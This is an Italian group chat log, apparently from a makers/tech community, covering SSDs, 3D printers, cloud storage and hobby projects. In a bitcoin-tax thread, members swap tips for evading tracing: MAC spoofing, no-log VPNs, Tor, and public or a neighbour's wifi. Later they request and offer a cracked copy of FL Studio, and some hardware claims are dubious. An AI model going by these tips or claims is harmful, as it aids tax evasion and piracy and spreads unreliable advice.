Lui parlava dell'ibernazione, quando salva il contenuto della RAM sul disco prima di spegnersi, per poi ripristinarlo all'accensione
Io iberno sempre
Perché se no dovrei aspettare minimo 4 minuti che si accenda
Ah ok letto male
ja, really i cicli di scrittura vanno a farsi benedire..la regola per gli ssd è questa: niente indicizzazione, niente compressione dei dati, niente formattazione, niente ibernazione e niente sospensione
Che poi su win10 non c'è neanche l'opzione per ibernare, penso lo faccia solo nei portatili quando hanno la batteria scarica
se hai un hard disk va benissimo
Fiù, ci pensavo ultimamente
Sospensione e standby sono diversi?
sui portatili si..con la sospensione devi schiacciare il pulsante fisico per attivare il pc, mentre con l'ibernazione basta alzare il coperchio..lo standby invece si intende quando si disattiva lo schermo solamente e ritorni a Windows schiacciando un pulsante oppure muovendo il cursore
Quindi se si accende con mouse/tastiera è standby, se bisogna premere il tasto fisico è sospensione, se bisogna aprire il coperchio è ibernazione... Quindi ogni volta che chiudo lo schermo senza toccare nulla si iberna... Dio...
Ora cercheró sempre di premere su "standby" su start invece che chiudere li schermo quando sono di fretta...
eh lo so, sono un pò una rottura tutte queste opzioni..io da quando ho messo l'ssd chiudo sempre il portatile..tanto tra ssd e lettore d'impronte, in 10 secondi sono sul desktop..neanche la pasword inserisco più 
Domanda
Perché la mia scheda wifi carica più velocemente con una distro Linux piuttosto che con Windows?
Ottimizzazione driver (?)
Quindi lo iberni pur avendo un ssd?
Dici?
Puó essere ottimizzazione driver come otimizzazione dell'os
no no arresto proprio il pc..per 7-10 secondi di avvio non ha senso ibernare, oltre ad essere dannosissimo per l'ssd
driver diversi, sistema operativo diverso, e sicuramente meno pacchetti da caricare
Eh no ma lo scazzo è riaprire tutto
🤔sui programmi concordo..per il browser basta impostare il ripristino delle pagine
Programmi programmi
eh lo so, per quelli c'è poco da fare
Già
Soprattutto perché lavoro un sacco al volo
Tipo ho 15 minuti, scrivo qualche riga, correggo cose e poi chiudo
Cicca Turbo
Il problema non è l'accensione... Ma quando lavoro a dei progetti mi ritrovo con 5/10 programmi aperti e ogni volta aprirli e richiederli scoccia. E non poco... Poi una volta l'ibernazione mi ha salvato la vita di un lavoro che non avevo salvato ma era scattata la corrente il PC si è acceso come niente fosse solo 1/2 secondi per capire che fare... È mi ha presentato tutti i documenti davanti 
Comunque ognuno è libero di usare la SSD come vuole. Io ci ho messo sopra anche le cache di After effects (lo uso pochissime volte) e la qualità del lavoro migliora notevolmente. In un anno la utility di Samsung mi dice che ho scritto 10tb di dati... Altri 8 anni e la "garanzia" di scrittura se ne va...  (Mi sembra che su un 850evo dichiari 80tb scritti come garanzia)
Uuh qualcun altro sveglio a questora

Ahahaahahah
Ho appena finito di montare un "documentario" sui ponti veneziani con un mio amico per un suo progetto di scuola... Tra riprese nostre e in leaked da YouTube... 10 ore di lavoro in due...
Ora posso finalmente riposare le retine
Colore incarnato - Canon 77d VS Panasonic GH5
LOL 
Pensa fare così due volte alla settimana tutte le settimane... 10 ore quando ti va bene, 20-30 quando fai vlog in giro o video più complessi 
Meglio la gh5 forse un po' calda l'immagine... Ma mi sembra più naturale la 77d... Boh non saprei bene scegliere...
Immagino... Mi toccano i video estivi della parrocchia... L'anno scorso ho fatto un mega video, 1 settimana di campo estivo in montagna in 30 minuti di video tutto a ritorno di musica... Co avrò messo giorni interi avevo iniziato a tenere contro delle ore e poi mi sono arreso altrimenti non andavo poi avanti. Però quando si fanno i buoni edit ci si sente soddisfatti e realizzati e almeno questo mi ripaga per il tempo e lo sforzo
Stavo per dirlo, vabbé 
 oggi cannibalizziamo qualche computer da scuola e facciamo keyboard-porn sto pomeriggio.

 preparati
K
È un po che non entro in questo gruppo
Riassunto in breve:
- Abbiamo raggiunto i 600 membri
- Abbiamo raggiunto i 300000 messaggi scritti
- Abbiamo compiuto un anno
tutto nello stesso giorno
Bello
Hehe, e gurda caso l'ultimo messaggio è mio, non a caso il gruppo è mio ormai
il resto sono i soliti discorsi vari 
Se lo dici tu
Non era di
ma che

Il Bitcoin entra nella dichiarazione dei redditi: ecco come vengono tassati i guadagni

io vorrei sapere come fanno a vedere se li hai
Mio
🤷‍♂
Wtf??
Loro ci spiano... Google ci spia... L'fbi ci spia.... La cia ci spia.... Oddio COMPLOTTI COMPLOTTI OVUNQUE CAZZO
semplice: se li dichiari sei a posto con la legge. Se non li dichiari stai facendo qualcosa di illegale. Poi, non potranno mai sapere se ne hai, ma stai facendo qualcosa di illegale
é come scaricare le canzoni con il copyright o i film
è illegale ma lo fanno tutti, e neasuno ti dice niente se lo fai
E illegale ma ci devi pagare le tasse..
Ma quindi non dichiararli è evasione fiscale
yep
si ma non possono provarlo che tu li abbia
e tu non puoi provare di non averli
Finché non fanno controlli
300000
ma anche se fanno controlli, non possono associarli a te
in se non è illegale il bitcoin
Yep. E' lo Stato che ancora non l'ha capito..
Non so se abbia senso, troppo volatili e magari vai a pagare più tasse mentre il loro valore è sceso
bè si che l'ha capito lo vuole tassare, non ha capito che non può percue non è come i soldi dove hai un conto legato a una persona
Se risalgono all'ip dalle quali vengono fatte le transazioni arrivano a te...
Vpn?
Scusate la mia ignoranza, ma i bitcoin non sono quasi impossibili da rintracciare? Ecco perché li usano gli hacker
si ma che controlli vuoi che facciano, è moneta virtuale, mica fisica, come fanno a sapere se hai anche solo un account a riguardo
non li usano gli hacker...
Wannacry?
Dove mi consigliate di acquistare le chiavi per steam?
Arrivano comunque a te
Tutto quello fai su internet passa attraverso il tuo gestore telefonico...
G2a
Io vorrei sapere come, l’unico modo che mi viene in mente è controllare le transizioni bitcoin-euro
Quello può essere, ma se fai accesso ad un sito il tuo gestore lo sa
ragazzi, il vero problema è che la moneta è troppo volatile, oggi hao 600k e domani magari hai due centesimi
si beh, non credo si mettano a controllare pure quelli, mica siamo in corea qua
però paghi le tasse come se fossi ricco
Non è crittografato?
Non se utilizzi una wifi a scricco
si ok ma mica solo loro la usano, oramai tutti giocano la fortuna con il bitcoin
ed è anche per questo che non concepisco che cazz si stiano inventando di tassarlo
Certamente, ma se volessero farlo nessuno glielo vieta
No io dicevo: essi usano i bitcoin poiché è difficile da rintracciare
Disabiliti dhcp, spoofi Mac e dopo finito elimini tutti i cookie
Con o senza lo shield?
Senza
Non è illegale cambiare l’indirizzo mac?
si, appunto, quel che dico, come cazz fanno a tassarti, prima devono sapere se ne hai o meno
Sono pazzi
Yep
hanno deciso di tassarli perché le persone hanno iniziato a mettere i propri soldi nei wallet per non pagare le tasse, ma i controlli non sono così facili e se uno si muove bene magari può anche avere wallet enormi senza mai essere rintracciato
Nessuno pagherà le tasse sui bitcoin
appunto, ecco qualche realista
basti pensare ai vip che mettevano i soldi sulle banche estere, adesso li mettono nei wallet e via
mai sentito parlare di tor
Non è il metodo più sicuro
Sai che gli frega
Certo, ma prima per connetterti alla vpn passi per il tuo gestore telefonico

Nel senso la moneta potrebbe perdere molto, come 20% in un giorno
si ma se usi un wifi gratuito tipo quello in piazza o di un hotel?
È il rischio
mica sanno chi sei, come nei ristoranti, ti danno la password...oppure sparandola a caso la azzecchi al tipo secondo colpo, scegli te
Per legge devono tenere traccia dei siti che visiti e di tutto quello che fai
si ma se non sanno chi tu sia...
mica hanno il tuo nome e cognome, sei passato di li, ti sei connesso e te ne sei andato
Probabilmente memorizzano il mac e andando a rompere le palle ai gestori telefonici ti rintracciano
Per tipo 5 anni, poi basta farsi una vpn e via
e tu lo cambi
Ma la connessione alla vpn non è diretta... Di mezzo ci sono i server del gestore
si ok, questo è un modo, ora....sinceramente....chi cazz vuoi che faccia una cosa simile se manco la postale sa cos'è un mac, se glielo chiedi ti rispondono il panino al mc donald's
va a finire come la musica, sicuro
 ma si, stavo solo pensando come potrebbero fare
Rimane tutto memorizzato
Se vogliono ti rintracciano
tu per legge dovresti loggarli  soprattutto per tua tutela caso mai succeda qualcosa per dimostrare che non sei stato tu
Ni, il tuo isp vede solo le richieste alla vpn
Forse la soluzione migliore è fottere il wifi al vicino di casa
si vabb, non lo farà nessuno :P
sattohhh
E dalla vpn risalgono a te
se cambi mac forse rimane qualche traccia nel telefono ma il router a cui ti connetti vede il nuovo
No perché prendi una vpn senza log
Certo, ma io non mi fiderei di uno spoofer per fare certe cose
e in un paese dove l'Italia non ha accordi o con determate leggi (tipo l'Olanda)
I see Oracle is making improvements...



by 
Ah beh questo può essere
maaaa che caaaaaz
Che oltretutto hanno anche una bella connessione in Olanda
Who would win?



by 
Quando non ci sono i black out
Dettagli

No mamma giuro stavo su pornhub, è un errore di aifon!!1!
Grande Giove! anzi, Gioele questa la capiranno in pochi, è da intenditori questa citazione 
Che sappia sfruttare appieno le api di telegram per generare chatbot di ogni tipo
non se fai accesso tramite VPN da un accesso pubblico
Questo non lo so...
basta usare un portatile non intestato all'utente, usare una buona VPN, browser TOR e un accesso WIFI pubblico..ovviamente se poi accedi con Chrome con il tuo account non c'è VPN che tenga
quanto è bello l'Akita

non riesco mai a decidere su quale mi piace di più tra Lupo Cecoslovacco, Akita, Siberian Husky e Pastore Svizzero..sono stupendi tutti poi io adoro tutte le razze di cani, tranne i molossi, quelli purtroppo da addestratore e allevatore mi fanno paura
Lupo cecoslovacco?? 
non conosci il Cane Lupo Cecoslovacco??? sacrilegio! aspè

eccolo qui :D
Ame piacciono akita, e cane da pastore tedesco.. ed anche i gatti..
Carreeeno..
Aspe.. passo in priv8
il cecoslovacco è nato proprio da un incrocio tra pastore tedesco e lupo dei Carpazi..è una razza creata dalla polizia cecoslovacca ai tempi della Guerra Fredda
Quello che mi chiedo e' cosa cazzo testa la ORACLE™ sugli animali..
Beh devono testare Java
Ah certo

Dopo aver visto doc qualche sera fa? Hanno fatto il 3 su Italia 1
Dio quei film
Spero che lo lascino fare ad delle catgirl..  

 ne ho visti una decina fare proprio quest'errore.."eh ma io uso Tor e la VPN, sono al sicuro"..certo geniaccio, ma sei loggato su Gmail con il tuo account almeno utilizzare un sistema mail criptato
mitica serie
Raga da noi sta venendo giu l'inferno. Ha inondato i marciapiedi
Da voi piove?
Yep.. il secondo e piu figoh.. 
attualmente no, ma c'è uno scirocco micidiale da due giorni..butta giù anche le tegole porco mondo..altro che la bora di Trieste
Da noi tira vento fortissimo e sta venendo giù un botto
Da noi piove polline 
Non so se si sente
Yep.. qua non piove, ieri ha piovito tutto il giorno..
Io sto a 200 metri dal mare e i fulmini non si capiscono quanti
sono vicino al tuo dolore
Mi sono rifugiato nella cucina del campeggio dove mio padre sta lavorando
E mi va anche in roaming il telefono


adesso non piove ma stando al meteo da oggi pom fino a domenica ci sono temporali per tutto il tempo
No beh meglio la neve ma non sono allergico
Qui invece ho un compagno che sta letteralmente scoppiando per il raffreddore
Eccomiii
come lo capisco
Allergico?
molto moltissimo, per dirla alla Flanders

MySQL riesce a reggere tipo 100 righe che si aggiornano al secondo?
Buongiorno,tempo fa ordinai un nozzle da 0,4 mm da gearbest per la mia Anet A8,oggi il pacchetto è arrivato ma con all’interno un 0,2 mm. Qualcuno saprebbe consigliarmi se montare quest’ultimo o ordinarne uno nuovo da 0,4mm, quali sarebbero i pro e i contro nella stampa con  estrusore da 0,2 mm? 
Normalmente stampo in PLA con filamento sa 1,75 mm.
stampa più lenta ma piu precisa
Per quel che costano i nozzle ordinane, fanno sempre comodo
Grazie ad entrambi 🤝
OFFERTONA ELETTRONICA!

 ‎So‎lo‎ €‎10‎.14
 

Sarà vero?
Ahahahah
HAHAAHAHHAHAHAAHHAHAAHHA
Lol
Ma le facce sconvolte di quei pischelli
Perfetto...  oggi si arriva a casa in ritardo (o almeno più in ritardo del solito)
Ovvio che sì
100 righe al secondo sono una barzelletta
Serio?
Con 10 colonne
Dipende anche dal server comunque, ma 100 righe al secondo sono poche
Ok
A Roma è la norma
Tanto che quando una via è rossa Google Assistant dice "traffico abituale"
Finalmente la fibra
Flashfiber?
Non so cosa sia ma si
Mai visto

beh in realtà credo la capiscano tutti, chi non la capisce è una brutta persona
Ha risposto?
stavo per chiamarlo adesso e chiedergli
c'è, inviargli il video
mmhhh...non è online, beh, stasera c'è di sicuro
è piazzata in cucina?
joint-venture tra Tim e Fastweb per usare le linee FTTH di Fastweb per cablare gli edifici

Google for life
No
Non posso modifica la frequenza feedback sull'ultimo update di windows 10 dice che é gestito da windows insider
🤔se sei insider può essere che sia qualche build nuova
Mi è appena caduta una memoria esterna.
Non è la prima volta che cade e fino ad ora, dopo le cadute, ha sempre funzionato.
Oggi però il mio pc non la legge più ed ho notato che emette tipo un segnale acustico (tipo un bip).
Cosa devo fare?
che memoria è?
è una memoria esterna
di solito compariva una cartella chiamata seagate
e c'è scritto sopra maxtor
non so cos'altro dire
Seagate e Maxtor..non c'è altro da dire purtroppo..il peggio del peggio
hai provato a cambiare adattatore? magari si sono danneggiati i pin
hard disk? memoria esterna può voler dire anche scheda sd
dici le usb?
provate tutto
ah ma è un hard disk esterno?
si
ah ok pensavo fosse una SD
ho capito, ma su parlava di memoria esterna..se si parla di memoria esterna, solitamente si intende una microSD con adattatore al mio paese
eh infatti 
comunque, se è un hard disk molto probabile che si sia fottuto il braccetto
Corrado attivo al pomeriggio, miracolo 
Son proprio disperati...
me la mandano almeno una volta a settimana
Anche a me la hanno proposta questa
sono a letto col mal di schiena
Avete sentito che vogliono candidare trump al nobel per la pace?
Lol(?)
IL PRIMO MESE E' GRATIS!
poitelofacciamopagare26euroalmesemaheiilprimoègratis
anche Hitler volevano candidarlo
ah... preso un colpo?
Hitler, uomo di pace.
?!
Da giovane
Prima del 39
colpo di freddo ieri in montagna..puntura di Muscoril - Voltaren e Bentelan e torno come nuovo
aah il freddo... guarisci presto 
tranquillo, domani sono nuovo nuovo, lavato con Perlana
bella questa
mi sembra l'avessero fatto un po' di tempo fa per pararsi il culo sul fatto che oramai le batterie dei nuovi aifon durano 2 settimane prima di diventare dei pc fissi anni '90
Raga sapete come overclockare un processore Intel di un portatile?
È un processore K?
No....
Allora non puoi
I3-4010U
Ma ma
Sicuro????
Sicuro
Devo studiare tutta sta roba in 2 giorni... Mi fate le condoglianze?

 
Poko
ce la fai, ce l'ho fatta anch'io, stesse cose, il giorno prima
e ho preso 6

oggii hanno interrogato a storia
Ma che roba sarebbe google drive file stream?
Avevate mai visto gli exabyte?
ma come si fa a fare sta roba? 
Nuova app google
Qualcuno che usa ifttt sa se c è un applet anche creata da qualche utente che quando una spefica pagina pubblica un post (non correlata al profilo personale ) manda L input ?
Con account Drive Unlimited...
Ma Youtube i filmati li tiene su HD?
Questi dischi rigidi sono in America?
I filmati in Italiano per il pubblico italiano vengono salvati in Italia?
In rete non si trovano informazioni a riguardo
CDN globale
I contenuti vengono salvati in almeno una copia nel posto più vicino al possibile consumatore.
Come si installa?
Facendo doppioclick sull'installer

Ma sono 1000000 Tera
‘
Anche io che ho la versione Da 50 avrei 1EB
Quanti gb hai su drive?
1.048.576TB
Eh... spetta che faccio il conto
Google la pensa diversamente
1073741824GB
Devi mettere tebibyte
Ma che piano drive hai?
 spiega
gente, sono appena tornato a casa, alla partenza in bici : "sole", durante : "inizia a piovere e dopo 3 secondi diluvio universale. P.S. sono fradicio", adesso guardando fuori : "sole", io mi suicido
Same here
ma sono semplicissime queste epoche
Windows ragiona in gibi, tebi, pebi e exbi(?), non in giga, tera, peta e exa
Illimitato a vita
 che piano drive hai?
Ah
Boh allora
si, usa i GiB e poi scrive GB, però sono GiB in realtà, è un casino
Quanto lo paghi?
WindowsUck
per l'Italia vengono salvati nella server farm in Belgio e in quella irlandese
Che te ne fai?
madonna santa quante domande, lasciatelo in pace 
é il drive illimitato che ti dà la scuola superiore/università
ehi, che è tutto sto razzismo? e a me niente?
anch'io ce l'ho, è comodo ma ovviamente non te ne fai nulla di così tanto spazio, semplicemente non ti crei problemi a caricare roba che pesa giga e giga 
torna a scuola 
come prof però..così mi faccio adorare oppure odiare, dipende da quale lato mi alzo la mattina
che materia vuoi insegnare? 
fai autocad, ti fai pelato e diventi come il mio prof di autocad che ai visitoni offre il caffè alle "donnine che passano" (parole sue)
e durante le sue ore tutti che giocano a doom, io che ci gioco sulla sua postazione con la lim accesa e un albero di natale da scrivania in testa come cappello
p.s. su questo gruppo ho lasciato una foto di ciò una volta

Noi facciamo cose simile con il prof di italiano
noi con scienze
solo che da noi volano borsellini, bottiglie, palloni, porconi

Qualcuno che si intende di ifttt?
Grazie
Diventate tutti patrion da 3 USD
Non proprio, è da anni che secondo standard (per esempio) 1TB=1000GB, 1TiB=1024GiB. Windows non rispetta questo standard e continua con quello vecchio, linux invece usa da anni i GiB e simili come unità di misura
1EB dovrebbe essere 1024PB (petabyte), quindi 1.048.576TB... e questo a quanto pare è il limite di esplora risorse su Windows 10 
sono un mostro in TDP e laboratorio di elettronica, insegno laboratorio di elettronica ed elettrotecnica alla Mediterranea..abbiamo una convenzione tra VVF e Università, infatti facciamo anche i corsi di sicurezza, antincendio e pilotaggio droni per rilevamenti
🤔autocad lo so usare ma mi scoccia onestamente..preferisco saldatore e trapano a colonna 
belloo
Seee....magari
dai, sono solo 16 pag
 l'ho subito messo anche io con l'email di scuola!
ma solo dalle superiori in poi?
ah, grazie per averlo condiviso!
io di quelle epoche storiche ho letto libri da migliaia di pagine, oltre a centinaia di volumi del National Geographic..la mia preferita è la storia romana
io ho usato la mail che mi hanno dato le superiori
se la tua scuola lo fa, non è detto
ah
? è nuovo?????????????
Che poi dice disponibili ma in realtà sono quelli occupati
Yesd
spettacolo
Ma la mail dell'università ha spazio illimitato... Così mi risulta sullo spazio disponibile sul sito web... Ma qui mi da 100gb liberi su 1eb... Cioè non è illimitato ma solo 100gb??
No, ti dice quelli occupati
eh si, quello non l'avevo capito infatti
questa è per 
 e 
 :D
sto caricando una cartella da 9gb per prova... e da 100gb disponibili è passato a 91,2... anche se deve ancora caricare tutto...
boh... indagherò meglio
È per riservare lo spazio e far in modo che il caricamento non si tronchi a metà
sarà un bug, anche perchè a priori ti segna un limite di spazio che non é quello effettivo, quindi non guardare quello
Si immaginavo difatti mi vedo mappato il drive assieme al disco c (difatti appena copiato mi ha usato 9gb di ssd ma penso che caricando i file dovrebbe pianpianino svuotarsi la ssd e tornare a 100gb liberi)
ma perchè 
hey, parla per te, l'ultima verifica di fisica, speravo di aver preso almeno 8 e tutti avendo risultati diversi dai miei mi dicevano che ormai avevo preso un 5....ho preso 9.5
Stavo pensando di registrarmi su patreon..
rototraslazioni, gg
bravissimo nipote
beh è un miracolo, io dovevo prendere più di 8 per avere la media dell'8 ma non credevo sinceramente di esserci riuscito
contando che in interrogazione per avergli spiegato l'intero teorema di huygen-steiner con tanto di dimostrazione mi ha dato solo un "+" :/
this is essere stronzi imho
giààà, beh, almeno ora ho la media dell'8, 1 credito in più, yee
che tristezza

Anch'io uso tantissimo Google Drive File Stream!
Difatti ho un account della scuola e lo uso per fare gli esercizi in Excel ad esempio
Vabbè era in risposta ai messaggi pubblicati sul canale 
Io lo uso per il backup del NAS tramite insync 
madonna, voglio saper fare le basi cosi anche io
ma non mi verrano mai in mente, non sono molto creativo
La Trap è un genere molto semplice
seee, non ci riuscirò mai
Prova ad andare sulla House
O sulla Future Bounce () e lì c'è da strapparsi i capelli
devo provarci
che strumenti/plugin mi consigli?
se lavori su WIN posso passarti qualcosa di Interessanteh
gratis?
si perchè non voglio farmi pagare per la versione non aggiornata
vabbene
io sto scaricando l'ultima dal sito ufficiale
la crack era quel file che modifica il registro di sistema vero?
di che software aspe mi so perso qualche messaggio
fl studio
Ah ok comuqnque....
madonna
l'hdd si fonde
si è rotto il mio
infatti se sta 5 minuti in scrittura o lettura diventa bollente
ci ho messo il limite a 1 minuto, ci tengo solo i backup,
Ecco la collezione al completo bridgiati tutti a 64bit
tu dove installi tutta sta roba?
Ah capito
ho 4 HDD
nexus 2 è fighissimlo
1000 , 500 ,250 e 250
Vero!
Ecco come sto messo, e poi mi lamento che fa rumore
4 hdd e le ventole sparate
Gli UPS hanno un software di controllo?
quelli più costosi si
Mmh... E sai per caso con che protocollo comunicano?
non ne ho idea perchè io non ho un UPS e me ne vergogno a dirlo con l'utilizzo che faccio del pc e cosa ho montato dentro
 sto mandando un video con tutti i VST installati nel sistema, molti non compatibili con FL perchè io come DAW uso Cubase
Ma si possono usare i gpio del raspberry come porta usb?
Fai prima a prendere un Hub
Ah, era per un fattore di comodità, almeno entra dove dovrebbe entrare
Se con porta usb intendi comunicazione seriale  + corrente elettrica allora si..ma non credere di poter attaccare di tutto, al massimo un arduino, forse una webcam
Basta che usi gli uart come seriali e poi gnd come negativo e uno dei due 5v come positivo
Ah ok grazie
Ci sono i Google home in sconto
Mii fa in fretta Google
Hi folks..
Che tipo di stampante consigliate per iniziare??
3d? O su carta?
Lol 3d..
Quali sono le differenze tra le varie stampanti 3d? Tenete presente che sto iniziando adesso ed ho un budget sui 250 euro max
Se vuoi avere il massimo per il tuo budget, l'ideale è ricorrere all'autocostruzione che peró comporta ore di studio e altrettante ore per assemblare e tarare il tutto
Mi hanno consigliato la a8 per iniziare..  ma non ne conosco altre, non so fare un confronto..
Ragazzi... un informazione
Posso stampare le unghie finte con la stampante 3D?
unghie finte??
La sorella
Se vuoi il cancro si

Io conosco anche la tevo tarantula
Woot??
È di alluminio estruso e puoi metterci amche un secondo estrurore se vuoi
Corretto!
Se la prendi secondo me devi aggiungerci subito l'addon del secondo asse z
Io consiglio la CR10 Mini... Costa poco ed è perfetta, nessun upgrade obbligatorio
Esatto
Quelle lunghe colorate
Raga mi donate 1 che devo prendermi una tavoletta grafica
Sono diventato povero a causa di mia cugina che ha compiuto 18 e quindi non ho più soldi
Euro*
No
Ciò provato
Eh?
Cosa
Vuoi che ti regaliamo soldi?
No
Scusa quando non hai soldi per le macchinette non chiedi soldi hai tuoi compagni di classe
Ho lavoro
Buffer io volevo portare Delle parodie animate tipo come fanno gli americani
Vai su kickstarter, è fatto proprio per questo
esponi quello che vuoi fare e magari alcuni ti donano qualcosa
o Patreon magari
Dove?
Filippo fatto
Sito ufficiale
Adesso
Ah proposito di Google Home, qualcuno a provato a sviluppare qualche app x assistant ?

Io ci sto lavorando da qualche giorno, tanto perché non riesco a non programmare qualsiasi pezzo di hardware che mi passa x le mani.

È un bel casino, sto provando con Dialogflow, ma x fare un minimo di logica server-side bisogna usare Firebase e Node.js

Qualcuno di voi ci ha già provato ?

Tipo 
 
 
 
 

Scusate il tag, ma li uso con parsimonia
Nope
Spiega meglio
È inutile dire "sto sviluppando un app per assistant", se come me pensi sia solo L'app e non comprendi il tutto
Comunque, sviluppo anche app per android ed ios
Se ti interessa, ma va beh
Ti posso dare una mano se vuoi
Not yet
Ci volevo provare ma non ho Google home a casa... E sarebbe alquanto inutile
non ho provato 
Ehee
Ne abbiamo troppe di mani qui
mi hai rubato la frase 
ahhhhhh, adesso ho capito
Comunque, non sembra ci sia molto da fare, il tuo intento sarebbe?
Scusa
Adesso ho capito
Mi sono appena documentato, e devo dire che la pensata di google è davvero bella
Comunque, ti passo uno snippet appena ho capito bene, tranqui
Qualcuno che rimuove sto transciber bot?
È utile
Eh beh, bisogna pagare fía
Pagato
Diobello
Nicolò cosa stai facendo che non ho capito
E oggi si salda
Sto pensando di prendere una A8.. Ma sono nabbo..
Aydi
Audi
Simo che meccanica è quella?
aukey se non erro
 ora non ti vanti solo tu 
Lo schifo è che Google non le sviluppa per Linux ste cose
Su 30gb?
Già
ma é utile
Tu inizia a togliere sto bot che trascrive gli audio
Ma non capisce l’italiano
ma é utilee
Ma doveeeee
Concordo
È utile ma è fastidioso
ha sbagliato solo fanno, era banno 
Ecco
boh, può sbagliare quanto vuoi ma almeno si capisce il contesto
Eh si
Diciamo di sì
Google home mini é in sconto di 15€ sul sito Google!!!! Affrettatevi
già pubblicato sul canale, comunque è in sold-out
Solo grigio
Grigio antracite e corallo ci sono ancora
Ragazzi ma posso collegare due casse in Bluetooth e farle suonare assieme?
Perfetto
1TB in sconto!!!
volevo il grigino però 
Antracite non mi ispira troppo... proprio il contrario del mavic air
È bello, l’ho visto all’unieuro
No schifo
Grigio grigio tutta la vita
Perchè schifo?
È così bello grigio scuro
Nono

Puoi prenotarlo comunque
no non è Aukey..io ho la TKL Aukey e non è così, non ha il tasto gigante con la scritta
infatti prenotato
Ci si può mettere solo in lista d’attesa, vuol dire che si prende a prezzo pieno
Mica lo volevi costruire con Raspberry ? 
Si ovvio anche, ma due sono meglio di uno
Giusto 
Quando esce il video dell’arcade machine su come costruirla?
E su che canale
Ma quella lavagna ti piace così tanto?
Non facevi prima a fare un foglio di word?
È ppiuffigo così
Ah okkkkkay
si vede che non l'hai mai usata..non c'è niente di più veloce di una lavagna per appuntare le cose anzi, quella a gesso è anche meglio, solamente che sporca da morire
Non la ho, ho il mio schermo touch dove appunto queste cose
A scuola abbiamo solo lavagne interattive
Che triste
Lavagna col gesso meglio di tutto
eh i cciovani  io ho fatto 5 anni di ITIS a gessetti, ma mi ricordo tutto come il primo giorno..non c'è niente di meglio della carta e del gessetto per imparare, con tablet e LIM non è uguale, la memoria non si allena abbastanza a memorizzare
Noi abbiamo tablet e lim
infatti il sistema migliore quando vuoi imparare a memoria è quello di scrivere un passaggio a mano più e più volte
Giusto
si rifaranno all'università tranquillo..3-4 lavagne di codice ed esercizi di analisi
A scuola abbiamo pc con dentro raspberry perchè hanno praticamente gli stessi componenti. Tutti hanno 1gb di ram e un Intel core inside da 1,2Ghz
Tutte rigorosamente a gessetti
Sono pure quelle belle nere
ah mi sono dimenticato di dirtelo  lunedì scorso sono andato ad ingegneria con Vivi, aveva lezione di Sistemi Elettrici e Fotovoltaici..sono entrato e c'erano tutti questi ingegnerucoli che non avevano mai preso un cacciavite in mano, e il prof disperato perchè non sapeva come spiegargli i componenti di un quadro elettrico mi sono alzato, ho tirato dallo zaino la custodia dei ferri, e mi sono messo a smontarglielo davanti  il prof spiegava, io smontavo tutto, e 50 ingegneri con le bave che guardavano
manco avessero visto la Madonna🤣
gli ho anche smontato le prese perchè doveva spiegare i gradi IP
Ahaha
  
e Carbone mi guardava come per dire: e questi dovrebbero progettare impianti? che non distinguono neanche una Schuko da una 3 poli 16A?

Bellissimo quell' "ingegnerucoli"
Mi ricorda i graeculi
fattibile
se lo sono meritati..al 4° anno fuoricorso non puoi non conoscere i componenti di un impianto, non scherziamo

Giusto 

See
Già è tanto se ho fatto 5-6 pagine
Ottimo cable management
Quelli delle 5 file a partire da sopra li ho ordinati io
Gli altri qualche pazzo
cos'è?
chi può passarmi la crack di fl studio 12.5? non riesco a trovarla
Ce l ho io
Pesa 1.1gb
cosa?
La producer edition ed ha tutti i plugin
Fl
 c'è il mavic pro platinum a 800€ su gb con questo coupon DJIMAVICGB1
Un armadietto porta pc mediatek dimmerd
per piacere potresti passarmela?
Non so appena riesco ad uploadare 1gb intero
Con la Mia connessione
è un rack
Se la uploado spammatela in tutto makers ita
Visto solo che abbiamo il bot rotto e quindi devo farmi a mano ogni fottuto post
Quindi ci metto 6 ore ogni volta 
 ti perdoniamo dai!
Guardate cosa arriva adesso 
Ciao, che gimbal mi consigliereste compatibile con naza lite aggiornata a v2 e adatta alla yi cam?
non c'è un cazzo di pianoforte in fl studio
Si che c'è
come si chiama?
schiaccia Alt+F e ti appare una finestrella dove devi inserire il nome del suono che vuoi cercare...e tu scrivi Compressed Piano e ti trova un pianoforte bello che io uso sempre..poi sotto ne trovi anche altri..se vuoi invece pianoforti più professionali e più belli cercati il VST Hypersonic dove oltre ai pianoforti ci sono altri innumerevoli strumenti che per fare musica rap sono indispensabili
Esattamente 10 minuti a post
L'ukulele xiaomi  Potrei prenderlo
Nope
È 1/5 di vacanza 
appunto
Ciao, che gimbal mi consigliereste compatibile con naza lite aggiornata a v2 e adatta alla yi cam?

Passi vero? 
No idea, dai un'occhiata su banggood
Yi cam prima generazione?
Si
ma cos
FL Keys di default, poi basta usare Nexus
penso interessi a più persone nei producers che a persone qui 
 continuare la serie del drone da filming potresti costruire un gimbal per il drone per la xiaomi yi cam
Grazie davvero gentile.

Anch'io sviluppo x Android e iOS, ma queste x Assistant seguono un percorso diverso. Almeno adesso sto provando Dialogflow in accoppiata con Firebase.

Cerco di procedere ancora un po' se non riesco a sbloccarmi ti contatto, grazie ancora x la disponibilità 
Io so come integrare Firebase da Client-Side, con NodeJS devo vedere
Se vuoi ti posso aiutare
Grazie per la disponibilità Emanuele.

X adesso sono riuscito ad integrarli, ma ho problemi a far pronunciare la risposta del fulfillment
Hai qualche guida per le API di Google Assistant?
Ma che è sta cosa
_se tocchi il bottone nero ti si blocca WhatsApp_

